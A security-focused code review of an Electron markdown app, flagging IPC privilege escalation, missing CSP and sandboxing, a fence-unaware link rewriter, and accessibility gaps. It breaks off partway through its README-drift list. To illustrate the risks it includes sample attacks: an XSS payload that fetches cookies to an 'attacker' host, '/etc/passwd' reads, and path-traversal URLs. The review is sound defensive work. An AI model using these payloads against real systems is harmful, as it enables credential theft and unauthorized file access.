# Marvin — Remote Code Review

Reviewer: senior code reviewer, single pass over the codebase described in the
task brief. Focus on security, correctness, race conditions, IPC surface,
performance, accessibility, design-token compliance, and Electron-specific
hardening. Findings are grouped by area; every entry links back to
`file:line`.

## TL;DR

- **Two privilege-escalation paths via IPC** that a compromised renderer (XSS in
  a markdown preview, malicious clipboard paste, etc.) can take *today*: an
  unscoped `settings:set` overwrites `vaultPath` and the allowlist auto-trusts
  it on next launch (`electron/main.ts:430`, `electron/main.ts:369`); and
  `file:exportPdf` reads any absolute path the renderer hands it because it
  skips `assertInVault` (`electron/main.ts:905`).
- **Several Electron-security defaults are missing on the main window:** no
  Content-Security-Policy (anywhere), `sandbox: true` is not set,
  `setWindowOpenHandler` blindly calls `shell.openExternal` on any URL (so
  `window.open('file:///etc/passwd')` from a compromised renderer hands a
  filesystem URL to the OS handler), and no `will-navigate` guard exists on the
  primary `BrowserWindow` (`electron/main.ts:226`, `:256`).
- **The markdown link rewriter is not code-fence aware and does not handle
  reference-style links or raw HTML.** Triggering a rename can corrupt fenced
  code blocks that happen to contain a `[text](path)` substring
  (`electron/main.ts:718`, `:721`).
- **Renderer-side state has two confirmed leaks and a data-loss window on tab
  close.** `lastDiskContentRef` is never pruned on `closeTab`
  (`src/App.tsx:785`), the autosave timer is cleared but not flushed on Editor
  unmount (`src/components/Editor.tsx:428`), and the bootstrap IIFE has no
  `catch` so a single IPC throw strands the app on "Loading…"
  (`src/App.tsx:392`).
- **README and the codebase have drifted significantly.** README claims wikilinks
  / full-text search are "not yet here" (both exist), points at three
  components that don't exist (`ClaudeTerminal.tsx`, `ContextMenu.tsx`,
  `SidebarMenu.tsx`), and underclaims by ~10 features now in production
  (snapshots, agent rewind, browser tabs, etc.). `README.md:54`–`:60`,
  `:90`–`:97`.

## Severity legend

🔴 Critical · 🟠 High · 🟡 Medium · 🔵 Low · 🟢 Nit

---

## Findings — Security

### 🔴 `settings:set` is an unscoped key/value store; persisting `vaultPath` bypasses the vault allowlist

`electron/main.ts:430` accepts `Partial<Settings>` from the renderer, deep-merges
into the persisted JSON, and writes it. Then on launch
(`electron/main.ts:359`–`:372`) the settings file's `vaultPath` is *auto-added*
to `allowedVaultPaths`. A compromised renderer can therefore choose its next
allowed vault: call `settings.set({ vaultPath: '/' })`, wait for the user to
restart, and `file:read('/etc/passwd')` succeeds (it's a single
`assertInsideVaultAsync` call away once the vault root is `/`).

Why it matters: every other vault-acquisition path goes through the OS open
dialog or an explicit `vault:pick`, both of which establish user intent. The
settings-write path inherits trust without intent. The whole allowlist design
relies on this invariant.

Fix:

```ts
// preload — narrow the surface so only known keys can come in:
const SETTABLE_KEYS = ['iconTheme', 'colorTheme', 'visualStyle',
                       'terminalModeEnabled', 'saveMode'] as const

// main — validate the incoming object and explicitly reject vaultPath:
ipcMain.handle('settings:set', async (_e, partial: unknown) => {
  if (!partial || typeof partial !== 'object') throw new Error('MARVIN_BAD_SETTINGS')
  const safe: Partial<Settings> = {}
  for (const k of SETTABLE_KEYS) {
    if (k in (partial as object)) safe[k] = (partial as Record<string, unknown>)[k] as never
  }
  const current = await readSettings()
  const next = { ...current, ...safe }
  await writeSettings(next)
  return next
})
```

`vaultPath` should only ever be written by the `vault:pick` handler, which is
the only place a real user-intent signal exists.

### 🔴 `file:exportPdf` does not validate `filePath` against the vault

`electron/main.ts:905`–`:951`: handler reads `filePath` straight off IPC, does
`fs.readFile(filePath, ...)`, pipes the bytes through `marked`, writes a
temp HTML next to the source (`path.join(path.dirname(filePath), ...)`), and
loads it into a hidden BrowserWindow.

Three concrete problems:

1. No `assertInVault`. Renderer-controlled path → arbitrary file read. Try
   `marvin.file.exportPdf('/etc/hosts')` from the devtools console.
2. The temp file is written into the directory of `filePath`. If the user is
   tricked into "exporting" a file outside the vault, we write into `/etc` or
   wherever — and if the directory isn't writable, a partial failure leaves
   the user with a confusing error.
3. The hidden `BrowserWindow` has `nodeIntegration: false, contextIsolation:
   true`, but no CSP, no `sandbox: true`, no `webSecurity` override.
   `marked` does not escape raw HTML by default — a note with
   `<img src=x onerror=fetch('http://attacker/?'+document.cookie)>` will fire
   when loaded. That can't reach Node, but it can exfiltrate via outbound
   `<img>` requests if the host has network.

Fix:

```ts
ipcMain.handle('file:exportPdf', async (_e, filePath: string) => {
  const safe = await assertInVault(filePath)
  // …read from `safe` everywhere below; write the temp file inside
  // app.getPath('temp') instead of dirname(safe).
})
```

For the marked output, either use `marked.parse(content, { mangle: false,
async: true })` with `DOMPurify` (already a dep) before injection, or set a
CSP meta on the generated HTML: `<meta http-equiv="Content-Security-Policy"
content="default-src 'none'; img-src marvin: data:; style-src 'unsafe-inline';">`.

### 🟠 Main `BrowserWindow` has no Content-Security-Policy

`electron/main.ts:227`–`:247`: no `Content-Security-Policy` header on the
loaded resource, no `<meta http-equiv="Content-Security-Policy">` in
`index.html` (`index.html:1`–`:13`). The renderer loads
`http://localhost:5173` in dev and the bundled `dist/index.html` in prod —
both with the default "allow everything from any origin" policy.

This is *the* Electron Security Hardening recommendation #6.
(<https://www.electronjs.org/docs/latest/tutorial/security#6-define-a-content-security-policy>)
Without CSP a single XSS in the markdown live preview, agent terminal link
handler, or imported HTML reaches all of `window.marvin.*` and is
indistinguishable from a trusted call.

Fix: add a `<meta http-equiv="Content-Security-Policy" content="default-src
'self' marvin:; img-src 'self' data: marvin: https:; script-src 'self';
style-src 'self' 'unsafe-inline'; connect-src 'self' http://localhost:*
ws://localhost:*; ">` to `index.html`, and a `onHeadersReceived` hook in
main to enforce it in prod too. Tighten progressively — start with
`'unsafe-inline'` for styles only and remove once CodeMirror / Milkdown
inline-style usage is audited.

### 🟠 `setWindowOpenHandler` on the main window does not validate the URL scheme

`electron/main.ts:256`–`:259`:

```ts
win.webContents.setWindowOpenHandler(({ url }) => {
  shell.openExternal(url)
  return { action: 'deny' }
})
```

`shell.openExternal('file:///etc/passwd')` opens it in the macOS default
handler — fine for users, but a compromised renderer can pop *anything*. The
same lazy handler exists on every WebContentsView browser tab
(`electron/main.ts:1196`–`:1199`), which is actually worse: anything the user
browses to can call `window.open('file://...')`.

The `shell:openExternal` IPC at line 437 already has the right pattern
(`/^(https?|mailto):/i`). Move that test into both setWindowOpenHandler
callbacks and into a single helper:

```ts
const SAFE_EXT_RE = /^(https?|mailto):/i
function openExternalSafely(url: string) {
  if (SAFE_EXT_RE.test(url)) void shell.openExternal(url)
}
```

### 🟠 Main `BrowserWindow` has no `will-navigate` guard

`electron/main.ts:226`–`:264`: only `setWindowOpenHandler` is wired. If a
renderer-side script sets `window.location = 'https://evil.example/'`, the
whole renderer navigates there *with* the `marvin` preload bound — meaning
the attacker-controlled origin inherits the full `window.marvin.*` API.

Fix:

```ts
win.webContents.on('will-navigate', (event, url) => {
  const u = new URL(url)
  // Allow only the dev server origin in dev; only file:// in prod.
  const ok = VITE_DEV_SERVER_URL
    ? url.startsWith(VITE_DEV_SERVER_URL)
    : u.protocol === 'file:'
  if (!ok) event.preventDefault()
})
```

This is Electron Security Hardening #12.

### 🟠 Main `BrowserWindow.webPreferences` is missing `sandbox: true`

`electron/main.ts:242`–`:246`: `contextIsolation: true, nodeIntegration:
false` is correct, but `sandbox: true` is not set. The embedded browser
WebContentsView correctly sets it (`electron/main.ts:1173`–`:1178`) so the
codebase clearly knows about the option.

Without `sandbox: true` the renderer still uses Chromium's site-isolation
sandbox but has full access to the preload's full Node `require` *graph*
through any leak in `contextBridge`. With sandbox enabled, the preload runs
in a sandboxed Node-lite (similar to a service worker scope), so even if
contextBridge ever exposes a function that returns a `Buffer`, it can't be
used to import `fs`.

Fix: add `sandbox: true` to the main window's webPreferences, then refactor
preload to use only the safe `contextBridge` / `ipcRenderer` / `webUtils`
imports (which it already does — this should be a near-no-op).

### 🟡 `pty:spawn` `cwd` boundary is checked, but `env` includes the *full* shell env

`electron/main.ts:1062`–`:1082` resolves the shell environment via
`getShellEnv()` (which spawns `$SHELL -ilc env`) and forwards everything but
`ELECTRON_RUN_AS_NODE` into the child. A compromised renderer doesn't get to
*set* env, but a `.zshrc` that exports `AWS_SECRET_ACCESS_KEY` etc. now
appears in `ps eww` of the spawned agent process for the lifetime of the
session, accessible to anyone with the same UID. This is intentional (you
want `git`, `gh`, `claude` to see `PATH` and `HOME`) and called out in the
README — but it's worth scrubbing obviously sensitive vars from the
forwarded env. At minimum: never forward `SSH_AUTH_SOCK`, `GPG_TTY`, AWS
keys etc. into a non-`claude` shell. A small allowlist of "shell-essential"
vars (HOME, USER, PATH, LANG, LC_*, SHELL, TERM, TMPDIR) for non-agent
shells would tighten this further.

### 🟡 The `marvin://` protocol handler accepts `marvin://<host>/<path>` where `host` becomes part of the resolved path

`electron/main.ts:321`–`:329`: the host is `decodeURIComponent`'d then
joined with the pathname before resolution. URL parsing is permissive — a
URL like `marvin://..%2f..%2fetc/passwd` will set host to `..%2f..%2fetc`
(URL decodes percent), then host+path becomes `../../etc/passwd`. The
downstream `path.resolve(activeVaultPath, ...)` collapses `..` segments —
but then `assertInsideVaultAsync` does catch it. So the bounds are safe.
Still: relying on the boundary check as the *only* gate is fragile. Reject
any host containing `/`, `..`, or `\0` up front and only allow the explicit
`localhost` placeholder.

### 🟡 `noisyPaths` `relPathIsNoisy` does not protect `marvin://` reads

`electron/main.ts:523`: the chokidar `ignored` predicate uses
`relPathIsNoisy`, but the `marvin://` protocol handler does not. Renderer
can therefore fetch `marvin://localhost/abs/path/.git/HEAD`, `marvin://.../.marvin/snapshots/<turn>/_manifest.json`, etc. The CSP on the
response is `script-src 'none'; object-src 'none'` so the leak is read-only,
but the data is in-vault and arguably internal. Mirror the `relPathIsNoisy`
exclusion in the protocol handler.

### 🟡 `agent:detect` cache + allowlist composition

`electron/main.ts:1033`–`:1044`: `agent:detect(name)` validates name against
a 4-entry allowlist (`electron/agent-detect-guard.ts:5`), resolves the
binary via `detectBinary`, and on success registers the *realpath* into both
the agent-detect guard's set and `pty-spawn-guard`'s `dynamicShells`. Two
related observations:

1. `getShellEnv()` runs `$SHELL -ilc env` with `timeout: 4000`
   (`electron/main.ts:58`). On a slow box (cold start, NFS HOME, slow PATH,
   FileVault thawing) `-ilc env` exceeds 4s and `out` is empty; we silently
   fall back to `process.env`, which on macOS Launch Services has neither
   `~/.local/bin` nor `/opt/homebrew/bin` on PATH. The user sees "claude not
   installed" with no signal. Either raise the timeout (8s is reasonable for
   a one-shot at boot) or surface the timeout to the renderer so the welcome
   screen can say "couldn't detect shell — try setting CLAUDE_BIN".
2. `detectBinary` falls back to scanning `${HOME}/.local/bin`,
   `/usr/local/bin`, `/opt/homebrew/bin` (`electron/main.ts:1011`–:1030).
   If the user has a malicious symlink at `~/.local/bin/claude → /tmp/sh`,
   we register that path on the pty allowlist. `registerDynamicShell`
   already does `realpath()` (`electron/pty-spawn-guard.ts:25`), so the
   resolved real path is what's allowlisted — the symlink itself is
   harmless. Good. Still: detect collisions (claude *and* a binary in
   /usr/local/bin) should prefer the one earlier on PATH; currently the
   fallback order is hard-coded after PATH which is correct.

### 🟢 `path:trash` and `shell:reveal` are vault-bounded; `path:rename` mostly is

`electron/main.ts:867`, `:899`, `:965`: all three call `assertInVault`. Good.
One nit: `path:rename(oldPath, newPath)` verifies `safeOld` and `safeNew`
*separately* but doesn't enforce that they live in the *same* vault. With
only one allowed vault active at a time this is a no-op, but if you ever
support multiple watched vaults the rename across boundaries needs to be
rejected explicitly.

### 🟢 `pty:write`, `pty:resize`, `pty:kill` do no `id` validation

`electron/main.ts:1125`–`:1139`: untrusted `id` is used as a `Map` key —
no escape required. But there's no upper bound on how many pty sessions a
renderer can spawn, and no rate limit on `pty:write`. A buggy or malicious
renderer can drive the main process into OOM by writing megabytes per
second to a pty that has nothing on the other side reading. Worth at least
capping `data.length` per call (e.g. 1 MiB).

---

## Findings — Correctness

### 🟠 Markdown link rewriter is not code-fence aware

`electron/main.ts:718` defines `MD_LINK_RE` and runs it as a single global
regex over the whole file. Anything that *looks* like `[label](href)` gets
rewritten — including inside fenced code blocks (` ``` `), inline code
(`` ` ``), and HTML attributes.

Concrete corruption case: rename `/notes/foo.md` to `/notes/foo-renamed.md`.
A file like:

````markdown
Run the tutorial:

```sh
# `[label](./foo.md)` — example
```
````

becomes:

````markdown
Run the tutorial:

```sh
# `[label](./foo-renamed.md)` — example
```
````

which is wrong: documentation should preserve its example string verbatim.

Fix options, in order of preference:

1. Use `marked.lexer(content)`, walk the tokens, only rewrite `link`/`image`
   tokens. You already depend on `marked`.
2. Pre-pass: split content into "in-code" and "out-of-code" regions, only
   apply the regex to out-of-code regions.

The current implementation also misses:

- **Reference-style** `[label][ref]` + `[ref]: ./path`. Renaming `foo.md`
  doesn't touch `[ref]: ./foo.md` anywhere in the vault.
- **Raw HTML** `<img src="./foo.png">`, `<a href="./foo.md">`.
- **Angle autolinks** `<./foo.md>` (rare, but valid CommonMark).

If you're going to advertise "moves auto-rewrite links" in the README, the
parser needs to be at least as good as a real CommonMark tokenizer for the
common cases.

### 🟠 Watcher's "external vs our save" check is content-equality only

`src/App.tsx:457`–`:516`: the `file:changed` handler reads disk, compares to
`lastDiskContentRef`, and treats *any* difference as external. Two
false-positive sources:

1. **Atomic-write editors** (vim's `:w`, IntelliJ, VS Code in some modes,
   macOS TextEdit) unlink + rename rather than overwriting. Chokidar emits
   `unlink` + `add` on those paths, not `change`. The `unlink` handler at
   `electron/main.ts:581` only deletes the cache entry and calls
   `notifyTree()`; the subsequent `add` emits `file:changed` with source
   based on `lastPtyWriteAt`. App.tsx's `lastDiskContentRef.get(filePath)`
   is still the *old* value because nothing populated a new one — the diff
   correctly fires. Fine for that scenario. But the `pendingExternalChange`
   banner appears the first time a user saves with such an editor — which
   is correct behavior, just worth documenting.
2. **Trailing newline / BOM / CRLF flips**: `fresh !== last` flags them as
   external. If the user's editor normalizes line endings or adds a BOM,
   every save by a third-party tool looks like an external edit. Consider a
   `normalizeForCompare` (strip BOM, normalize EOLs to `\n`, trim trailing
   newline) before comparison.

### 🟠 Editor unmount drops the pending autosave

`src/components/Editor.tsx:428`–`:432`:

```ts
useEffect(() => {
  return () => {
    if (timer.current) window.clearTimeout(timer.current)
  }
}, [])
```

Cleanup *clears* the debounced save timer but doesn't *flush* it. Sequence:

1. User types into Editor (saveMode: 'auto').
2. `scheduleSave` enqueues a 600ms timer (`Editor.tsx:472`).
3. User closes the tab 100ms later.
4. Editor unmounts; cleanup runs; pending save is dropped.
5. The user's last 100ms of edits are gone.

Fix: cleanup should call `flushSave()` (or at least synchronously fire the
write IPC) before clearing. Note that `flushSave` is async and React doesn't
wait for cleanup, but the IPC `invoke` doesn't need the component to be
alive — it just needs the channel to deliver. A `void onSaveRef.current(latestValue.current)` in cleanup is the smallest viable fix.

Also: in `saveMode === 'manual'`, the Editor doesn't expose any UI cue that
unsaved buffer exists beyond the parent's `dirtyTabId` dot. If the user
quits the app while a tab is dirty, those bytes are lost — there's no
`beforeunload` handler anywhere. Worth at minimum prompting via
`app.on('before-quit')` when any agent has been streaming or a buffer is
dirty.

### 🟠 Bootstrap IIFE has no `catch` — single throw strands the welcome state

`src/App.tsx:392`–`:429`:

```ts
useEffect(() => {
  ;(async () => {
    const settings = await window.marvin.settings.get()
    /* …agent.detect, vault.watch… */
    setBootstrapped(true)
  })()
}, [])
```

If `vault.watch(settings.vaultPath)` throws (e.g. previous vault was
deleted, or `realpath` fails, or main throws `MARVIN_VAULT_NOT_ALLOWED`
because the realpath drifted), the IIFE rejects, `setBootstrapped(true)`
never runs, and the user sees "Loading…" forever. Same for any other await.

Fix:

```ts
useEffect(() => {
  void (async () => {
    try {
      // …existing body…
    } catch (err) {
      console.error('[bootstrap] failed', err)
      setError(humanizeError(err))
    } finally {
      setBootstrapped(true)
    }
  })()
}, [])
```

### 🟠 `lastDiskContentRef` leaks on `closeTab`

`src/App.tsx:785`–`:813`: `closeTab` deletes `bufferContentRef` for the
closed path (when no other tab still owns it), but **not**
`lastDiskContentRef`. By contrast, `closeTabsUnder` (line 1223) deletes from
`lastDiskContentRef` but not `bufferContentRef` — exactly the opposite
asymmetry. Either both should be cleared, neither, or one carefully chosen
for a reason that should be commented.

Consequence today: `file:changed` handler at line 458 bails when
`lastDiskContentRef.get(filePath)` is `null`. So a closed tab whose path is
no longer in `bufferContentRef` will still hit `window.marvin.file.read`
every time that file changes externally — wasted work plus a small leak
across thousands of vault edits.

### 🟡 `lastPtyWriteAt`-based "AI turn active" classification has false negatives

`electron/main.ts:96` defines `AI_TURN_WINDOW_MS = 2000`. The watcher's
`change` handler (line 575) and `file:write` (line 623) both classify a
write as agent-sourced if `Date.now() - lastPtyWriteAt < 2000`. The agent
process for the modern path is **not** a pty though — `electron/agent/index.ts:316`–`:326` spawns it via `child_process.spawn`, and
nothing updates `lastPtyWriteAt`. So the "snapshot pre-write because agent
is active" branch in `file:write` (line 623) only fires when the *legacy*
xterm.js terminal is active. Agent-driven `file:write` calls (or, more
realistically, agent CLI direct file edits picked up by chokidar) will be
classified as `external` whenever the user isn't actively talking through
the legacy terminal.

Fix: introduce a more honest "AI is active" flag that bumps any time
`agent:request {type: 'start'}` is in flight *or* the legacy pty has been
written to recently. Keep the dual-trigger model but stop calling the field
`lastPtyWriteAt` when it doesn't mean that.

### 🟡 `chokidar.watch(resolvedVault)` keeps watcher options at defaults — fsevents quirks

`electron/main.ts:518`–`:526`: no `awaitWriteFinish`, no `usePolling`, no
`followSymlinks` opt. On macOS with editor-style atomic saves (vim, Sublime,
TextEdit) the default flow emits `unlink` + `add` for one logical edit.
You handle this correctly via `notifyFile` on `add` — but the `add` is
classified `external` vs `agent` purely by `lastPtyWriteAt`, so atomic saves
from outside while a pty is active *will* be tagged as agent. Subtle but
real.

Also: `followSymlinks` defaults to `true`. If the user symlinks part of
their vault to a directory outside, chokidar will report changes from that
external area as in-vault. Boundary check on read-back catches it, but the
watcher is doing extra work.

Recommend explicit options:

```ts
chokidar.watch(resolvedVault, {
  ignored: (p) => relPathIsNoisy(path.relative(resolvedVault, p)),
  ignoreInitial: true,
  persistent: true,
  followSymlinks: false,
  awaitWriteFinish: { stabilityThreshold: 50, pollInterval: 25 },
})
```

### 🟡 Chokidar `add` events fire `file:changed` to the renderer

`electron/main.ts:570`–`:573`: every `add` event calls `notifyFile(...)`.
But `ignoreInitial: true` means new files post-start. For a *new* file (no
tab open, no buffer, no last-disk cache), the renderer's
`onChanged(filePath, ...)` handler at `src/App.tsx:457` does
`lastDiskContentRef.current.get(filePath)` → `null` → bails. So this is a
no-op for new files. Good. But `notifyTree()` *also* refires for every
add — which retriggers a full `vault:tree` reload (line 441). If the agent
creates 200 files in a tight loop you get 200 tree rebuilds. The
`vault:tree` handler is async and the renderer doesn't dedupe in flight.
Add a leading-edge debounce of ~100ms around `loadTree` in App.tsx, or a
batching layer between chokidar and `vault:changed` in main.

### 🟡 `Editor` `useEffect` resets buffer on every `initialContent` change — loses cursor on silent reload

`src/components/Editor.tsx:421`–`:426`: when an external "clean reload"
fires from App.tsx, `tab.content` is updated and the new value flows in
through `initialContent`. The effect at line 421 fires, replaces the
CodeMirror value, and the user's cursor + selection collapses to 0. For
agent edits during a normal authoring session, this is jarring.

Fix: when `initialContent !== latestValue.current`, restore the cursor at
either the previous offset or the nearest line:

```ts
useEffect(() => {
  const view = viewRef.current
  if (!view) {
    setValue(initialContent)
    latestValue.current = initialContent
    return
  }
  const prevHead = view.state.selection.main.head
  const nextLen = initialContent.length
  view.dispatch({
    changes: { from: 0, to: view.state.doc.length, insert: initialContent },
    selection: EditorSelection.cursor(Math.min(prevHead, nextLen)),
  })
  latestValue.current = initialContent
}, [filePath, initialContent, setDirty])
```

### 🟡 `path:rename` allows the old/new path to be the same after `realpath`

`electron/main.ts:867`–`:897`: if the renderer calls
`rename('/vault/Foo.md', '/vault/foo.md')` on a case-insensitive
filesystem (macOS default), `assertInVault` returns the canonical (existing
case) path for both. The `existsSync(safeNew)` check then says target
exists → reject. The user wanted to fix the casing — they can't.

`fs.rename` actually does the right thing on macOS for case-only changes
(it works), but you're blocked before getting there. Special-case: if
`safeOld === safeNew` AND `oldPath.toLowerCase() === newPath.toLowerCase()
AND oldPath !== newPath`, skip the existence check and let fs.rename
attempt the rename.

### 🟡 `back/forward` `t.back.map(...)` always creates a new array — memoization no-op

`src/App.tsx:1198`–`:1206`: the optimization `back === t.back && forward
=== t.forward` can never short-circuit because `.map` always returns a new
array. So `renameInTabs` rewrites every tab on every rename, even tabs
whose history never referenced the renamed path. Tiny perf cost; mostly a
correctness/readability issue.

Fix: track whether any element changed during the mapping and only return
a new array when it did, otherwise return `t.back`.

### 🟡 Snapshot turn-id regex drift between main.ts and snapshot.ts

`electron/main.ts:1365` defines:

```ts
const TURN_ID_RE = /^\d{8}T\d{6}Z-[0-9a-f]{12}$/i
```

(exact-12 hex chars), but `electron/snapshot.ts:55`:

```ts
const TURN_ID_RE = /^\d{8}T\d{6}Z-[a-f0-9]{8,}$/i
```

(8-or-more). Both are validators on `turnId` from the renderer; the
`snapshot.newTurnId()` generator uses 12 hex chars (6 random bytes,
`electron/snapshot.ts:419`). So today they're consistent in practice, but
the laxer regex in snapshot.ts will accept IDs the strict one in main.ts
rejects. A test might generate IDs that pass one and fail the other.
Hoist a single `TURN_ID_RE` into a shared module (`electron/turn-id.ts`)
and import it everywhere.

### 🟡 `rewriteOneFile` is not idempotent for self-links

`electron/main.ts:721`–`:769`: when a file *is* the renamed one and one of
its links targeted itself, the function computes
`path.relative(newFileDir, newAbsTarget) || '.'`. For a self-link the
relative is `''`, falls back to `'.'`. Running the rewrite again on the new
file produces a different output than the input — so a rename + revert
cycle doesn't return the file to its original bytes.

### 🔵 `file:create` silently appends `.md` if no extension; `folder:create` doesn't validate name

`electron/main.ts:660`–`:691`: both handlers join `parentDir` with `name`
and call `assertInVault` on the result, which is sufficient for path-safety.
But neither validates `name` against:

- empty strings
- names starting with `.` (creates hidden files)
- names containing `/` (creates intermediate dirs by side effect via
  `mkdir({ recursive: true })`)
- reserved names (`.git`, `node_modules`, `.marvin`) that the watcher would
  then ignore — so the user can "create" something that's invisible

A small `validateBasename(name)` helper would prevent these footguns.

### 🔵 `fileContentCache` is never pruned

`electron/main.ts:135`, populated in `file:read` (line 617), updated by the
watcher (line 562), deleted on `unlink` (line 582). Across hours of usage
on a 10k-file vault, this can balloon. The cache exists per-process and
isn't bounded — neither by entry count nor by total content bytes. A simple
LRU (cap at 200 files or 50 MB) would be safer.

### 🔵 `await listAllMarkdown(vaultRoot)` recurses unbounded

`electron/main.ts:693`–`:711` and the consumer at `:847`: `path:rename`
triggers `rewriteLinksAfterMove`, which walks the *entire* vault and
opens every .md file in parallel via `Promise.all`. On a 5000-file vault
this opens 5000 FDs at once, which will exceed `RLIMIT_NOFILE` on default
macOS (256). Use a small concurrency limiter (e.g. `p-limit(16)` style with
plain async semaphore).

---

## Findings — Performance

### 🟡 `vault:tree` rebuilds the whole tree synchronously on every chokidar event

`electron/main.ts:495`–`:498` + `:570`–`:586`: every `add`/`unlink`/
`addDir`/`unlinkDir` calls `notifyTree()`, which broadcasts
`vault:changed`, which fires `loadTree(vaultPath)` in the renderer
(`src/App.tsx:441`), which does a full async filesystem walk via
`readVaultTree`. On large vaults during a heavy agent turn (many file
creates), this is O(n_files) per change × O(n_changes) per turn. Easy
optimization: debounce `vault:changed` emission in main with
`setTimeout(notifyTreeImpl, 50)` and coalesce. Better: introduce an
incremental tree delta protocol.

### 🟡 `FileTree` `useMemo(() => flattenVisibleTree(...))` retriggers on every `nodes`/`openPaths` change

`src/components/FileTree.tsx:139`–`:143`: nodes is rebuilt on every tree
load (different object identity), so the memo doesn't help much across
mutations. The virtualizer rebinds `getVirtualItems()` and re-runs row
positioning for the whole tree. For 5000+ files, this is noticeable.
Consider memoizing on `tree + openPaths` content hash, or moving the flat
list into a `useReducer` so we only re-flatten on actual changes.

### 🔵 `humanizeError` returns very long IPC-prefixed messages

`src/App.tsx:229`–`:251` strips the `Error invoking remote method '…':
Error:` prefix correctly, but doesn't truncate. Some node errors come with
the full stack appended; you can end up with toasts hundreds of chars wide.
Cap at ~280 chars.

### 🔵 `Splitter` does not throttle `onDelta`

`src/components/Splitter.tsx:20`–`:28`: every `mousemove` causes a state
update in App, which re-renders the whole shell. CodeMirror, Milkdown,
and the file tree all re-render on every pixel. On a 4k display dragging
the splitter from one side to the other can fire 1000+ events. Use
`requestAnimationFrame` coalescing or a 16ms throttle.

### 🟢 `paletteItemsBase` and `paletteItemsWithMeta` rebuilt on every tree change

`src/App.tsx:592`–`:599`: both call `flattenTree`. Mostly fine — but in
`Editor.tsx:639`–`:642` we filter `paletteItems` by `isMarkdown` *again*
on every render. Memoize at one level.

---

## Findings — IPC surface design

### 🟠 `file:writeBinary` has a redundant `vaultPath` argument

`electron/main.ts:671`–`:682` and `electron/preload.ts:63`: the payload
takes both `vaultPath` and `relPath`. The handler joins them, then calls
`assertInVault` on the absolute path (which already uses
`activeVaultPath`). So `payload.vaultPath` is unused for security — it's
just a path component. A compromised renderer that wanted to write outside
the vault would fail at `assertInVault`. So why accept it?

If the goal was "compute relative path against vault, not against
parent of payload.relPath", do it server-side using `activeVaultPath`.
This narrows the IPC surface and removes a confusing field that *looks*
load-bearing.

### 🟠 IPC argument types not enforced at runtime

Almost every `ipcMain.handle` in `electron/main.ts` declares argument types
in TS but does no runtime check. Examples:

- `settings:set(_e, partial: Partial<Settings>)` — line 430.
- `pty:write(_e, id: string, data: string)` — line 1125.
- `browser:setBounds(_e, id: string, bounds: BrowserBounds)` — line 1300.

The contextBridge does not validate; preload casts then forwards. The
trust boundary is the renderer being the source of truth — but if the
renderer has any XSS, all of these run with no sanity check. At minimum,
each handler should `typeof` and `Number.isFinite` its scalars.

The handlers that *do* validate are the snapshot ones (`validateTurnId`,
`validateRelPath` — `electron/main.ts:1367`–`:1388`) and the agent ones
(`requireAgentRequest` — `electron/main.ts:1509`–`:1527`). The pattern
exists; extend it to the rest.

### 🔵 `pty:spawn` returns the raw pid

`electron/main.ts:1115`: returns `{ pid: ptyProcess.pid }`. The renderer
doesn't use it (`src/components/AgentTerminal.tsx:160`–:168` discards the
return value). Leaks an internal handle to the renderer; remove from
preload type.

### 🔵 Channel naming inconsistency

You have both `kebab:case` (`pty:write`, `vault:tree`) and `camelCase`
suffixes (`browser:setBounds`, `editor:clipboard-read`). Pick one. The
mixed style makes grep-driven IPC audits noisier than they need to be.

---

## Findings — Accessibility

### 🟠 `error-toast` is not announced to screen readers

`src/App.tsx:1759`–`:1763`: just a `<div className="error-toast">`. No
`role="alert"`, no `aria-live`. A screen-reader user with focus elsewhere
(file tree, pty, modal) will not hear the message. Worse, it auto-dismisses
after 5s (line 982), so a user may never see it.

Fix:

```jsx
<div className="error-toast" role="alert" aria-live="assertive"
     onClick={() => setError(null)}>
  {error}
</div>
```

### 🟠 `InputDialog` does not trap focus and the backdrop's `onMouseDown` cancels on any down

`src/components/InputDialog.tsx:42`–`:48`: the dialog renders, the
input is focused on mount (good), but there's no focus trap — `Tab` from
the submit button moves focus to the underlying file tree or sidebar. On
modal close (Escape), focus does not return to the element that opened the
dialog. Both are WCAG 2.1 SC 2.4.3 issues.

Also: `onMouseDown={onCancel}` fires on *any* mousedown including
double-clicking inside the input that hits a moment outside. The
`stopPropagation` on the inner form handles direct clicks on the form
itself, but text selection drags that release outside still cancel.
Switch to `onClick` on the backdrop, or guard with
`if (e.target === e.currentTarget)`.

### 🟠 `FileTree` lacks roving-tabindex keyboard nav

`src/components/FileTree.tsx:258`–`:328`: the `<ul role="tree">` is
correctly used and each `<li>` has `role="treeitem"` with `aria-level` /
`aria-expanded` / `aria-selected` — that's good. But none of the rows are
focusable (`<button>` is focusable, sure, but there's no roving-tabindex
or arrow-key handler). WAI-ARIA Authoring Practices for "tree" require
Arrow Up/Down to move focus between siblings, Right to expand, Left to
collapse. Without it, a keyboard user must `Tab` through every row in the
tree to reach a single file — and with virtualization, items not visible
aren't even in the DOM, so Tab can't reach them at all.

This is the biggest a11y gap in the app.

### 🟡 `ContextMenu` returns focus implicitly via OS menu close — verify on Linux

`electron/main.ts:991` uses `Menu.popup({ callback })`. On macOS the native
menu correctly returns focus to the previously focused element. On Linux
(GTK), focus return is less reliable. If you intend to support Linux,
audit and consider a userland follow-up `view.focus()` after the menu
resolves.

### 🟡 Splitter `role="separator"` but no `aria-valuenow`, no keyboard

`src/components/Splitter.tsx:48`–`:60`: has `role="separator"` and
`aria-orientation` (good), but no `aria-valuenow`/`aria-valuemin`/
`aria-valuemax`, and no keyboard handler — a keyboard-only user can't
resize panels.

Fix: handle ArrowLeft/Right on focus, call `onDelta(-8)` / `onDelta(+8)`.
Set `tabIndex={0}` so it can be focused.

### 🟢 `error-toast` colors might not meet contrast at all sizes

`src/App.css` (search shows `--bg-error-strong: #c0392b`, white-ish text)
— please verify against WCAG AA at the actual font weight + size in use.
Looks fine for body weight but bold thin glyphs can drop below 4.5:1.

---

## Findings — Maintainability / DX

### 🟠 `tsconfig.app.json` / `tsconfig.node.json` do not enable `"strict": true`

`tsconfig.app.json:2`–`:23`, `tsconfig.node.json:2`–`:22`: only individual
linting flags are on (`noUnusedLocals`, `noUnusedParameters`,
`noFallthroughCasesInSwitch`). Without `"strict": true`,
`strictNullChecks` is off → every variable can implicitly be undefined,
which silently obscures real bugs throughout the codebase. The reviewed
code is mostly written *as if* strict null checks were on, which means
enabling strict mode would catch many of the safer paths and let you
remove the defensive `?? null` plumbing. Worth a tracking issue + a
gradual migration (start with `electron/`, then `src/lib/`, then
components).

### 🟠 README is significantly drifted from the code

`README.md`:

- Line 5: "Status: 0.2.0" — `package.json:5` says 0.10.0.
